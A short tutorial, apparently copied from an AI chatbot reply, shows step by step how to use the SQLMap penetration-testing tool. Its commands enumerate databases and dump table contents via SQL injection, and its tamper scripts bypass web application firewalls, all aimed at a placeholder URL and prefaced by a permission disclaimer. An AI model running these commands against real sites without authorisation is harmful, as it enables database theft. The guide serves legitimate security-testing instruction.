Using SQLMap Efficiently

August 14, 2023
using sql-map step-by-step

Certainly! SQLMap is a powerful open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. Here's a step-by-step guide on how to use SQLMap:

Disclaimer: Always ensure you have permission to test the target. Unauthorized testing can lead to legal consequences.

1. Installation:

SQLMap is typically available in the repositories of major Linux distributions. You can also clone it from its GitHub repository.

bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

2. Basic Usage:

To start using SQLMap, you'll need a URL that you suspect is vulnerable to SQL injection.

bash
python sqlmap.py -u "http://targeturl.com/page.php?id=1"

3. Data Retrieval:

Once you've identified a vulnerable target, you can retrieve data from the database.

  • Database names:

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" --dbs

  • Tables of a database:

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" -D dbname --tables

  • Columns of a table:

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" -D dbname -T tablename --columns

  • Data from a table:

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" -D dbname -T tablename -C column1,column2 --dump

4. Advanced Usage:

SQLMap offers a wide range of advanced functionalities.

  • Using POST data: If the vulnerable parameter is sent via a POST request, you can use the --data flag.

    bash
    python sqlmap.py -u "http://targeturl.com/login.php" --data="username=admin&password=admin"

  • Using cookies: If the website uses cookies, you can include them in your SQLMap command.

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" --cookie="PHPSESSID=12345; othercookie=67890"

  • Using a proxy: If you want to route your traffic through a proxy (like Burp Suite or OWASP ZAP), you can use the --proxy flag.

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

  • Tamper scripts: SQLMap comes with a variety of tamper scripts that can be used to bypass web application firewalls (WAFs) and other security mechanisms.

    bash
    python sqlmap.py -u "http://targeturl.com/page.php?id=1" --tamper="between,randomcase,space2comment"

5. Cleanup:

After testing, always ensure you clean up any changes you made to the database, if any.

6. Stay Updated:

SQLMap is actively developed, so it's a good idea to periodically update it to get the latest features and improvements.

This is just a basic guide to get you started with SQLMap. The tool has a plethora of options and functionalities that can be explored using the -h or --help flag. Always ensure you're using the tool responsibly and ethically.
